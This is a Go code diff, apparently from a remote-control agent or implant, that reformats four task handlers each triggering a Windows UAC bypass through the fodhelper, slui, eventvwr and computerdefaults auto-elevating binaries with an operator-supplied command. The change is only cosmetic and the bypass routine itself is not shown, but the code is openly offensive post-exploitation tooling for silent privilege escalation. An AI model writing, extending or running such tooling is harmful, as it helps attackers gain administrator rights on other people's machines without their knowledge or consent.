@@ -167,25 +167,37 @@ func handleUACBypass(task Task, res *TaskResult) {
 
 // UAC sub-methods used by elevate()
 func handleFodhelper(task Task, res *TaskResult) {
-	if runtime.GOOS != "windows" { res.Error = "Windows only"; return }
+	if runtime.GOOS != "windows" {
+		res.Error = "Windows only"
+		return
+	}
 	_ = tryUACBypass("fodhelper", task.Command)
 	res.Output = "fodhelper triggered"
 }
 
 func handleSluiUAC(task Task, res *TaskResult) {
-	if runtime.GOOS != "windows" { res.Error = "Windows only"; return }
+	if runtime.GOOS != "windows" {
+		res.Error = "Windows only"
+		return
+	}
 	_ = tryUACBypass("slui", task.Command)
 	res.Output = "slui triggered"
 }
 
 func handleEventvwrUAC(task Task, res *TaskResult) {
-	if runtime.GOOS != "windows" { res.Error = "Windows only"; return }
+	if runtime.GOOS != "windows" {
+		res.Error = "Windows only"
+		return
+	}
 	_ = tryUACBypass("eventvwr", task.Command)
 	res.Output = "eventvwr triggered"
 }
 
 func handleComputerDefaultsUAC(task Task, res *TaskResult) {
-	if runtime.GOOS != "windows" { res.Error = "Windows only"; return }
+	if runtime.GOOS != "windows" {
+		res.Error = "Windows only"
+		return
+	}
 	_ = tryUACBypass("computerdefaults", task.Command)
 	res.Output = "computerdefaults triggered"
 }
